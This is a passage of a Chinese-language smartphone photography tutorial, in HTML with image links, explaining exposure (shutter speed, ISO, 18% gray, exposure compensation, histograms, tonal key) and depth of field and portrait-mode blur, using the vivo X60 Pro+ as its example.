data-original=\"https://pic1.zhimg.com/v2-502343fbba6b94448bd5b0f956295a6c_r.jpg\"></figure><p>那么显然，快门速度越长，进入的光线就会越多，那么我们拍摄的画面结果就会越亮。</p>\n<p>快门速度的跨度其实是非常大的，它可以是一瞬间，比如 1/2000S，它也可以是一段时间，比如 30S。他们之间相差有 60 万倍。那显然他们拍摄的画面效果是完全不同的。</p>\n<p>下图的快门速度是 1/5000S ，我们发现画面中所有人物的动作都被凝固了起来。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ebb8d26db9ccbc155ec07f6f16603cb9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3834\" data-rawheight=\"2876\" class=\"origin_image zh-lightbox-thumb\" width=\"3834\" data-original=\"https://pic2.zhimg.com/v2-ebb8d26db9ccbc155ec07f6f16603cb9_r.jpg\"></figure><p>而下图的快门速度是 0.7S ，我们会发现画面中的景物，尤其是光线会形成一种轨迹。这其实就是我们常规所说的光绘摄影，或者说慢门长曝光摄影。不过，想要拍摄这样的画面，有一个非常重要的前提，这就是需要拍摄时保持画面的稳定。只要画面晃动，就会造成画面模糊。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d2fe81044678809103fc539190ef6c69_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic2.zhimg.com/v2-d2fe81044678809103fc539190ef6c69_r.jpg\"></figure><p>这就是为什么星空摄影，光绘摄影都需要三脚架的配合。</p>\n<p>当然，影响画面明暗的不仅仅是快门速度一个参数。我们继续回到刚才的相机原理，我们知道光线最终是被「传感器」 记录的。那么显然这个传感器对于光线的感知能力，也影响着画面的明暗。</p>\n<p>同样时间进来的光线，如果这个传感器对于光线的感知能力强，那么显然画面就会亮，而如果这个传感器对于光线的感知能力不强。那么显然画面就会暗。而这个描述出传感器感光能力的数值，就是感光度。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-53a9bd913674019797063ab17284b15f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-53a9bd913674019797063ab17284b15f_r.jpg\"></figure><p>在胶片摄影时代，胶卷的感光度是固定的，比如 ISO 800、ISO 160 等。但是今天的数字传感器，感光值是一个可以变化的范围。</p>\n<p>vivo X60 Pro+ 的感光值范围是 50-3200。</p>\n<p>可想而知，感光值越高，画面越亮，感光值越低，画面越暗。</p>\n<p>这么一听，你可能会很兴奋，那是不是说只要我们无限控制感光度，我们就可以任何光线都能拍照。可事实我们发现我们并没有随心所欲。这是因为，今天的传感器有一个特性：</p>\n<p><b>随着感光值的提升，照片的画质会极速下降。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e265ec0b01ff2fe5c9ad60efaf2517f6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-e265ec0b01ff2fe5c9ad60efaf2517f6_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b9423bd9b15d269f3089d21332454b3f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-b9423bd9b15d269f3089d21332454b3f_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-6003bd2cd3f915728b4db947bad084dc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-6003bd2cd3f915728b4db947bad084dc_r.jpg\"></figure><p>所以，调高感光值是有一个限度范围。而这个范围远没有大家想的高，对于手机来说，我认为 1600 已经算作是上限了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-05b0962f3508728487a5795617eb57b8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-05b0962f3508728487a5795617eb57b8_r.jpg\"></figure><p>好了，了解到这里，你已经知道如何控制画面的明暗了：</p>\n<ol>\n<li>快门速度</li>\n<li>感光值</li>\n</ol>\n<p>但其实如果你使用的是传统相机，还有一个很重要的参数，这就是光圈，但因为手机目前的光圈不可调节，所以为了减少学习压力，此处就按下不表。</p>\n<p>当然我知道读了这么多，其实你就学了两句话：</p>\n<p><b>快门速度越慢，画面越亮，快门速度越快，画面越暗。</b></p>\n<p><b>感光值越高，画面越亮，感光纸值越低，画面越暗。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-08dd2a95833462b771950565b735c346_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-08dd2a95833462b771950565b735c346_r.jpg\"></figure><p>但是实际上，以上的原理过程才是真正对你创作有帮助的。如果我上来就告诉你结论，你会单纯的机械记忆。</p>\n<p>在以后的拍摄，或者是摄影学习中会遇到各种疑问。但是现在你从原理出发，这两句话只是顺其自然的结果。你就可以合理应用，比如现在你知道了：</p>\n<p><b>我想要画面中动态的效果，我就要延长快门速度。而此时画面过亮了，那我就降低一些感光值。</b></p>\n<p>当然你可能会说，这些参数我懂了，可是我在手机拍摄时，从来没有见过这这些参数。</p>\n<p>不，你见过。</p>\n<p>打开 vivo X60 Pro+ 的专业模式，我们就会看到 ISO 感光值 和 S 所代表的快门速度。点按两个参数进行调节，感受一下是不是和我前面描述的效果一致。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-78e198852ab5969cb21f0bd2ddad5c9a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic3.zhimg.com/v2-78e198852ab5969cb21f0bd2ddad5c9a_r.jpg\"></figure><h3>光的标尺</h3>\n<p>但对于曝光来说，学会控制曝光的工具才仅仅是第一步。</p>\n<p>而下一步，才是这一章节中最为重要的内容：</p>\n<p><b>到底什么样的曝光是合适的。</b></p>\n<p>但这里的合适，它是由两层含义的。一个是，客观上的合适，我愿意叫做为正确的曝光。另一个是，主观上的合适，我愿意叫做美的曝光。可能比较抽象，那我直接使用一张图举例你可能就会立刻了解了：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-4139a6c6b332a80c091900a4deafca03_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-4139a6c6b332a80c091900a4deafca03_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f5c053ad5912b13526f2e5938e736916_b.jpg\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-f5c053ad5912b13526f2e5938e736916_r.jpg\"><figcaption>同一场景下不同曝光</figcaption></figure><p>第一张图，画面整体明暗非常合适，整个画面都很细节丰富，层次丰满，显然这是正确的曝光。</p>\n<p>但是第二张图，画面整体非常偏暗，甚至是画面中很多都是死黑一片，显然这不是正确的曝光。</p>\n<p>可如果我问，哪两张图是美的，耐看的，我相信一定会有很多人会选择第二张。</p>\n<p>也就是说，正确的曝光并不等于美的曝光。</p>\n<p>但这不是说正确的曝光不重要，恰恰相反，我们要先从正确的曝光开始。</p>\n<p>今天我们的手机都是机器会自动曝光的，但是显然如果我们想要自动曝光，那么就要有一个所谓的参考。而这个所谓的参考并不是一个科学结论，而是一个通用准则，这就是：</p>\n<p><b>18% 的灰色。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-5db0dd390abcd3245d6d513518b8166a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-5db0dd390abcd3245d6d513518b8166a_r.jpg\"></figure><p>手机在拍摄一张照片时，机器会主动的计算调整参数，让整个画面最后获得的拍摄亮度信息混合以后为 18% 灰。这就是我们所说的「正确的曝光」。</p>\n<p>当然，对于拍摄过程来说，我们并不需要知道这些，我们仅仅是需要知道，对于任何一个场景，我们都能计算出一个对应的曝光值。大多数情况下，这个曝光值都是准确的。那么获得这个信息以后，我们就会获得一个曝光调整的法则：</p>\n<p><b>快门速度（S）+ 感光值（ISO）= 确定的曝光值（EV）</b></p>\n<p>需要注意的是，这里的加号只是关联的关系，并不是真正的加法。通过这个公式我们可以知道，在调整曝光时，如果我们目前曝光值是正确的，那么我们还想要调整快门速度时间变长，就需要再相应的调整感光值降低平衡画面的亮度。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-bef1bfc23b9a727b7ecedcb54817a5ee_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic3.zhimg.com/v2-bef1bfc23b9a727b7ecedcb54817a5ee_r.jpg\"></figure><p>一个最生动的例子就是车轨摄影。</p>\n<p>我们想要画面中车有轨迹流动，就需要快门时间延长，但是一旦延长画面就会变亮，此时就需要降低感光值来让画面变暗。所以你看，只要你从原理角度去真正了解曝光，其实曝光是非常好理解的。</p>\n<p>但既然是通用准则，那么 18% 灰这个参考就有失效的时候。比如如果画面中的黑白比例差别较大，就容易出现曝光不准确的情况。</p>\n<p>一个最为经典的案例就是当我们面对太阳逆光拍摄的时候，是不是很容易出现人脸黑的情况。这就是因为画面中亮部白色过多，为了 18% 平衡权重，就会压低整个曝光。这个时候，我们就需要主动去提高曝光，这就是摄影师提到的曝光补偿。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-0e6ebe60e98eb16710dce4618101175c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-0e6ebe60e98eb16710dce4618101175c_r.jpg\"></figure><p>而这个曝光补偿按钮，其实你也在 vivo X60 Pro+ 的专业模式里见过，就是画面中的这个 EV。当你调整 EV 的时候，我们看到画面整体变亮或是变暗。</p>\n<p>不过即使到这里，曝光还是一个比较抽象的概念，到底怎么样曝光好像只能凭感觉。别急，还有一个本章节最为重要的知识点，这就是曝光的真正标尺：</p>\n<p><b>直方图。</b></p>\n<p>我们知道画面中的像素无非就是从最暗到最亮的像素组成，最暗就是黑色，最亮就是白色。那么如果我们以亮度作为横坐标，对应亮度的像素数量作为纵坐标，就可以获得一张画面中曝光信息的「分布图」，这就是直方图。</p>\n<p>我们其实可以直接通过下面三张不同曝光倾向的图里，就可以看到不同的直方图类型。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-886b16d28b3a4ff91ac0837d6a3ae9ea_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3032\" data-rawheight=\"2274\" class=\"origin_image zh-lightbox-thumb\" width=\"3032\" data-original=\"https://pic3.zhimg.com/v2-886b16d28b3a4ff91ac0837d6a3ae9ea_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9dc0e415f3a7a3f58ce496675619ed51_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3032\" data-rawheight=\"2274\" class=\"origin_image zh-lightbox-thumb\" width=\"3032\" data-original=\"https://pic2.zhimg.com/v2-9dc0e415f3a7a3f58ce496675619ed51_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3359155ef3006231fc0f6ea54cbcf87c_b.jpg\" data-size=\"normal\" data-rawwidth=\"3032\" data-rawheight=\"2274\" class=\"origin_image zh-lightbox-thumb\" width=\"3032\" data-original=\"https://pic1.zhimg.com/v2-3359155ef3006231fc0f6ea54cbcf87c_r.jpg\"><figcaption>三种不同倾向的曝光</figcaption></figure><p>那么在这三张直方图中，图二显然就是前面提到的正确曝光的直方图。因为在这个直方图中我们可以看到画面中绝大多数像素集中在中间画面，暗部和亮部也有对应的信息。</p>\n<p>而图一，画面的像素都集中在左侧的暗部，自然就是曝光不足。</p>\n<p>图三，画面中的像素都集中在右侧的亮部，自然就是曝光过度。</p>\n<p>所以我们在拍照的时候，完全就可以通过直方图来判断曝光情况。尤其是在一些极限环境中，比如太阳强烈，你根本无法确认屏幕中曝光情况，此时就可以通过直方图了解。而这个直方图，其实很多手机的专业模式都有配备，比如 vivo X60 Pro+ 就可以在专业模式的设置中打开。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f134ad2cf4e8da4a3f81585bbfa910f1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-f134ad2cf4e8da4a3f81585bbfa910f1_r.jpg\"></figure><p>而说到这里，你就需要知道一个词了，这个词就是「影调」。</p>\n<h3>光的高低</h3>\n<p>显然，所谓的影调这个「调」字，和我前面所说的韵律是一样的，依然是借鉴于音乐。就算我不是一个懂音乐的人一说调子，我也知道「低调」或者是「高调」一说。那其实所谓的影调也是如此，我们上述举例的曝光不足的这张图，就是典型的低调作品。</p>\n<p>那么什么是高调作品呢，比如下面这一张：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-287805c67aa0794cbeaa05ab3752eefc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic1.zhimg.com/v2-287805c67aa0794cbeaa05ab3752eefc_r.jpg\"></figure><p>而所谓的高中低调作品它们对应的直方图，如图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-bf440c5803e821439e1162a6cde4c866_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"506\" data-rawheight=\"200\" class=\"origin_image zh-lightbox-thumb\" width=\"506\" data-original=\"https://pic3.zhimg.com/v2-bf440c5803e821439e1162a6cde4c866_r.jpg\"></figure><p>这就是为什么我说直方图就是曝光的指南针，因为它可以直接用直观的方式给我们展示影调。而至于选择哪一种影调，就是我们自己来决定的。</p>\n<p>讲到这里，也是时候总结了。而这里的总结也很简单，现在你只要打开你的手机中的专业模式，比如我手里的 vivo X60 Pro+，在这个界面里：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2ba1cf3cc12db3513a30f3923fd36ec1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-2ba1cf3cc12db3513a30f3923fd36ec1_r.jpg\"></figure><ul>\n<li>\n<b>EV：</b>调整曝光倾向</li>\n<li>\n<b>ISO：</b>感光值，数值越大，画面越亮，但是画质降低，反之亦然。</li>\n<li>\n<b>S：</b>快门速度，时间越长，画面越亮，但是画面中的物体会有拖影，反之亦然。</li>\n<li>\n<b>WB：</b>白平衡，之前虽然没有提到，但是用起来也很简单，你只要知道可以让颜色变冷或者是变暖即可。</li>\n<li>\n<b>AF：</b>对焦模式切换，后面会有章节讲到。</li>\n<li>\n<b>Raw：</b>曝光的原始信息格式，后期空间大，但是一定要后期，而且需要更多的存储空间。</li>\n<li>\n<b>直方图：</b>曝光的参考标尺，可以让自己了解画面的曝光情况，并且配合拍摄对应的影调。</li>\n</ul>\n<p>曝光知识是整个摄影知识的基础，不过好在它至少具有一定逻辑，甚至是有迹可循。但是对于曝光的理解，往往是摄影师作品风格的基础。比如，一些清新系人像，他们的直方图都是高调的直方图。所以这部分知识，如果你一次没有弄懂，一定多阅读，多尝试。</p>\n<p>只有深刻了解曝光，才能真正的绘制光线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-066b6f1983977a086336bacee66d0fe1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-066b6f1983977a086336bacee66d0fe1_r.jpg\"></figure><p>当然我知道很多人刚开始学习摄影时，对于光线并不敏感。这里有一个很重要的建议，这就是你可以先从黑白摄影开始。因为黑白摄影就是纯粹的亮度信息，我们就是要通过控制画面的明暗来展示内容。所以对于曝光的选择，就决定了一张作品的与众不同。其实关于影调，还有「长和短」的概念，这里篇幅的问题，就算留给你的课后作业，但请一定要去了解，一定收获颇丰。</p>\n<p>不过虽然现在你已经学会了使用手动模式进行拍照，调整参数控制画面的明暗，但也不意味着每一张照片都需要使用手动模式拍摄。其实恰恰相反，手动模式一般都是特殊场景，比如星空、光绘场景中使用。而大多数生活中场景我们完全可以信任手机自己的自动曝光。不过这种信任是有限的，我们依然需要对手机自动的曝光结果进行控制。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-537e8404d95bb4ce2b3ed9dee563cb96_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic3.zhimg.com/v2-537e8404d95bb4ce2b3ed9dee563cb96_r.jpg\"></figure><p>比如我们可以通过点按手机的拍摄界面不同位置，来干预曝光。比如点击画面中较亮的地方，整个画面就会变暗。点击画面中较暗的地方，整个画面就会变亮。或者我们可以在点按画面以后，调节曝光滑杆来进行调节。而这种方式也是最常见的控制曝光的方式，几乎所有本文出现的照片都是使用这种曝光方式来拍摄。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-6d8788cf35e3d44063304f43d5473025_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-6d8788cf35e3d44063304f43d5473025_r.jpg\"></figure><p>我自己的一个习惯就是点按画面以后，略微压低一点曝光。不要小看这个操作，就是这样一个简单操作会对你照片的质感有着非常明显的提升。因为目前所有的手机出发点还是记录，所以它的曝光倾向都是为了保证信息充足而尽可能的亮。但这会缺少影调，甚至是让颜色失真。</p>\n<p>不信，你现在打开手机，自动拍摄一张照片，然后再手动调节降低一点曝光进行拍摄。你会发现两张照片的影调、细腻度、色彩感，完全不一致。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2745b086dc1edaa00b6aac56869300a7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-2745b086dc1edaa00b6aac56869300a7_r.jpg\"></figure><p>每一次按下快门，其实都是对「光」进行一次捕捉。当你真的可以掌握曝光的时候，你会发现整个世界都是你的画布。记住：</p>\n<p>「从来没有什么正确的曝光，有的只有你心里想要的曝光。」</p>\n<h2>05. 虚与实</h2>\n<p>这一章节我们将会聚焦在一件事上，这就是「对焦」。</p>\n<p>说到对焦，对于一些手机用户是非常陌生的，但是对于很多相机用户来说是再熟悉不过，因为所有的专业相机，对焦都是一个重要的衡量参数。但这不是说手机不需要对焦，而是手机一方面因为传感器面积小，所以景深比较深，另一方面如今的数码相机自动对焦能力很强，所以感知不明显。</p>\n<p>但是随着手机硬件规格的提高，尤其是这几年手机的传感器面积越来越大，我们的手机也开始出现浅景深效果。比如本文中举例的 vivo X60 Pro+ 甚至是有接近一英寸的传感器面积，眼看就和卡片机的传感器大小一致了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-cb089ce1085d18697401ac69d32fd8a6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-cb089ce1085d18697401ac69d32fd8a6_r.jpg\"></figure><p>所以掌握对焦，就成为了今天很多手机摄影用户的分水岭。因为如果你能够了解景深原理，并加以利用，就能够拍摄出所谓的「相机氛围」。</p>\n<p>不过说到这里，你可能对景深这个词还非常陌生。但如果我换另外一个说法，你就懂了，这就是「虚化」。虚化就是景深变化的一个结果。不过为了让你更好的控制虚化，我们需要先从景深的具体概念开始。</p>\n<h3>景深</h3>\n<p>由于照片是二维的，但实际真实世界是三维的。假设我们的照片是二维坐标的 XY，所以当我们看到画面中有清晰，有模糊的时候会觉得清晰和模糊是在 XY 中选择。但其实，照片的清晰和模糊范围是在 Z 轴上进行选择，看图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-fe5a5f040f297cabdd74c78f7a3e8ebf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"589\" class=\"origin_image zh-lightbox-thumb\" width=\"940\" data-original=\"https://pic4.zhimg.com/v2-fe5a5f040f297cabdd74c78f7a3e8ebf_r.jpg\"></figure><p>通过上图我们可以清晰的了解到，景深其实就是一个清晰的范围。而相机所谓的对焦过程，就是把你想要拍摄的主体放置到这个清晰的范围中。</p>\n<p>这个清晰的范围越短，我们就叫做浅景深，那么背景的模糊虚化也就会越明显。清晰的范围越长，我们叫做深景深，那么背景的模糊虚化越不明显。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4b8ff5fdf2ac7e8b5c8640ec98d234e0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-4b8ff5fdf2ac7e8b5c8640ec98d234e0_r.jpg\"></figure><p>那么影响景深的范围（即 L 的长短）有哪些因素呢？</p>\n<ol>\n<li>镜头光圈，光圈越大，景深越小；光圈越小，景深越大。但目前主流手机的镜头光圈不可以修改，前文已经提到。</li>\n<li>焦距，焦距越长，景深越小；焦距越短，景深越大。这也是为什么等效 50mm 或者是等效 125mm 的两颗长焦镜头更适合拍摄人像，因为虚化好。</li>\n<li>对焦距离，在其它条件相同的情况下，对焦越近，景深越小。</li>\n<li>相机的传感器面积大小，传感器越大，景深越小，虚化越明显。</li>\n</ol>\n<p>在这几个因素中，摄影师可以调整的因素就是焦距和对焦距离。所以我们想要照片中实现虚化的效果，就可以从这两处下手。</p>\n<p>比如让镜头尽可能的接近被摄主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-2b08b2e629cb44958b59e03b771ed9fe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic3.zhimg.com/v2-2b08b2e629cb44958b59e03b771ed9fe_r.jpg\"></figure><p>最为经典的一个例子自然是拍摄树叶和花朵。如果我们离树叶和花朵比较远，那么画面很杂乱，但是当我们逐渐靠近，不仅可以拍摄到树叶的细节，树叶以外的背景还有非常好看的虚化光斑效果。</p>\n<p>不过需要说明的是，任何镜头由于物理法则，都有一个限制，这就是你不可能完全贴近物体对焦，任何镜头都会有「最小对焦距离」。</p>\n<p>当然，这种最小对焦距离可以通过特殊的光学设计来更缩短，比如 vivo X60 Pro+ 的微距模式，就是让最小对焦距离变短，从而实现微距效果。</p>\n<p>另一个获得虚化的方式就是使用长焦镜头。比如我们看使用 vivo X60 Pro+ 等效 50mm 焦距的镜头拍摄时镜头焦外非常明显。这非常有利于简化画面的同时，突出画面中的人物主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-920c021c40b072acdeba7c2f4aa2299c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-920c021c40b072acdeba7c2f4aa2299c_r.jpg\"></figure><p>以上两种方式，虽然能够达到不错的虚化效果，但对比相机的虚化效果还相差甚远。尤其是相机中大光圈镜头迷人的虚化焦外，往往决定了人像作品的质感。不过我也多次提到，手机的光圈不可以调整，所以我们也就无法获得这种效果。</p>\n<p>但人像模式的出现，打破了这一规则。</p>\n<h3>人像模式</h3>\n<p>虽然手机物理上无法实现大光圈虚化，但是我们可以「计算虚化」。而随着这几年手机摄影计算能力的进步，甚至是大多数情况已经可以做到「以假乱真」的虚化。即使还算作是有一定摄影经验的我自己，乍一看有时候也很难分辨两张照片是手机拍的还是相机拍的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-e8929836a7ebe0d858dd7dfc669a64ab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-e8929836a7ebe0d858dd7dfc669a64ab_r.jpg\"></figure><p>但是前提是，我们要学会利用人像模式。</p>\n<p><b>1. </b> <b>人像模式的虚化是可以调节的</b></p>\n<p>虽然目前手机的人像模式抠像算法已经非常准确，但是有件事依然需要我们自己做主，这就是虚化的程度。这就像是专业相机调整光圈一样，虚化程度需要我们自己控制。</p>\n<p>比如在 vivo X60 Pro+ 的人像模式中，我们是直接可以选择不同的光圈数值，实现不同的虚化效果。但是需要注意的是，这些调整需要我们在前期就做好决定，拍摄后无法更改。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-8388f464ca404ca347ebebf7c7b25fb8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic1.zhimg.com/v2-8388f464ca404ca347ebebf7c7b25fb8_r.jpg\"></figure><p><b>2. </b> <b>要自然，就要合理</b></p>\n<p>虽然是算法模拟的，但是想要手机的人像模式真实自然，其实依然需要遵循物理虚化的原理。比如我经常看到一些虚化明显的作品都是半身人像居多，很少有全身人像。这是因为想要全身人像，就意味着摄影师离拍摄主体相对较远，根据前面的原理可知，景深自然深，虚化不明显。</p>\n<p>所以如果我们使用人像模式拍摄全身照，如果虚化很猛烈，就会显得照片很假。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-93d7c0c4a03794a38787a1e52ba2257c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3120\" data-rawheight=\"4160\" class=\"origin_image zh-lightbox-thumb\" width=\"3120\" data-original=\"https://pic1.zhimg.com/v2-93d7c0c4a03794a38787a1e52ba2257c_r.jpg\"></figure><p>再举一例。</p>\n<p>很多人在拍照的时候，背景非常单一，比如是一面白墙。那么此时人像虚化，自然不够明显，因为这种场景即使是最大光圈的专业相机拍摄也不会好看，因为没有「虚化」的深度。所以想要好看的虚化建议就是：</p>\n<p>「尽可能的人物远离背景，或者是背景有着丰富的光源形成光斑。」</p>\n<p><b> 3. </b> <b>人像模式，也可以拍「东西」</b></p>\n<p>这也是一个很严重的误区，很多人觉得人像模式只能拍人像。但是实际上，今天的虚化算法早就是一个综合技术，不仅仅可以用来拍摄人像，用来拍摄美食、静物都是一个很好的选择。而这些主体使用人像模式最重要的好处就是可以极大的简化画面，突出主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-208727f44d022495dafa651ea2d3c15b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-208727f44d022495dafa651ea2d3c15b_r.jpg\"></figure><p><b>4. </b> <b>学会「玩转」焦外</b></p>\n<p>这一点其实特别有趣，因为这也是手机摄影和传统相机最大的不同，因为算法的想象力是无限的。比如其实不同镜头的焦外效果是不一样的。所以这也是为什么很多摄影师会买不同的镜头，因为它们焦外的味道不一样。尤其是一些老镜头，因为做工的问题，会让焦外有一定的特点，而这种特点会成为一种风格。比如蔡司的 Biotar 镜头，就会有一种有意思的焦外旋转。</p>\n<p>以前如果你想要获得这种效果，就需要找到对应的镜头，但因为今天是算法模拟，所以我们可以直接从算法入手，获得这种效果。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a523a2c6e0a2d4f31c0b94c192423cd4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-a523a2c6e0a2d4f31c0b94c192423cd4_r.jpg\"></figure><p>比如 vivo X60 Pro+ 中就可以直接选择这种 Biotar 